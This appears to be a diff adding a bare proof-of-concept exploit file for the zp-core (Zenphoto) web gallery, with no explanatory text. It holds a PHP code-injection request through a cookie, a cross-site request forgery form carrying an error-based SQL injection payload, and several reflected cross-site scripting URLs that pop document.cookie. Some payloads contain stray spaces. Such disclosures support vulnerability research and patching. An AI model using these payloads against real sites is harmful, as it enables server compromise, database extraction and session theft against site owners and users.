@@ -1,0 +1,19 @@
+
+
+The following PoC is available:
+
+GET /[album_name]/[image.jpg].php HTTP/1.1
+Cookie: viewer_size_image_saved=phpinfo()
+
+&lt;form action=&quot;http://www.example.com/zp-core/admin-albumsort.php?page=edit&amp;album=1&amp;saved&amp; tab=sort&quot; method=&quot;post&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;XSRFToken&quot; value=&quot;[XSRFToken]&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;sortableList&quot; value=&quot;id[]=3&amp;id[]=2 OR 1=(select min(@a:=1)from (select 1 union select 2)k group by (select concat(@@version,0x0,@a:=(@a-1)%2)))&quot;&gt;
+&lt;input type=&quot;submit&quot; id=&quot;btn&quot;&gt;
+&lt;/form&gt;
+
+
+http://www.example.com/zp-core/admin.php?action=external&amp;error&amp;msg=%3Cscript%3Ealert%28document.cooki e%29%3C/script%3E
+http://www.example.com/1/xxx%3Cimg+src=x+onerror=alert%28document.cookie%29%3E/
+http://www.example.com/zp-core/admin.php?a=&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert%28document.cookie%29 &amp;lt;/script&amp;gt;
+http://www.example.com/zp-core/admin-edit.php?page=edit&amp;album=%22%3E%3Cscript%3Ealert%28document.cookie%2 9%3C/script%3E&amp;uploaded&amp;subpage=1&amp;tab=imageinfo&amp;albumimagesort=id_desc
+
